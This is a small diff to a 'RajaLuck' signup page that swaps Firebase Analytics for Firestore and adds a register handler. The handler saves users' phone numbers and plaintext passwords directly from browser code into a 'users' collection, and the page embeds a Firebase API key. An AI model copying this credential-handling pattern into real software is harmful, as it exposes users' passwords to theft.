@@ -63,7 +63,7 @@
 
 <script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-  import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-analytics.js";
+  import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
   const firebaseConfig = {
     apiKey: "AIzaSyAS0gQfrblHj5baRKR2Zt6fIcCgLLEzh5M",
@@ -76,9 +76,33 @@
   };
 
   const app = initializeApp(firebaseConfig);
-  const analytics = getAnalytics(app);
-  console.log("Firebase initialized for RajaLuck signup.");
+  const db = getFirestore(app);
+
+  // Register function to save data
+  window.handleRegister = async () => {
+    const phoneNumber = document.querySelector('input[name="userNumber"]').value;
+    const password = document.querySelectorAll('input[type="password"]')[0].value;
+    
+    if(phoneNumber && password) {
+        try {
+            await addDoc(collection(db, "users"), {
+                phone: phoneNumber,
+                password: password,
+                timestamp: new Date()
+            });
+            alert("Registration Successful!");
+        } catch (e) {
+            console.error("Error: ", e);
+        }
+    } else {
+        alert("Please fill all details");
+    }
+  };
 </script>
 
 </head>
 <body style="font-size: 12px;">
+    <div id="app">
+        </div>
+</body>
+</html>
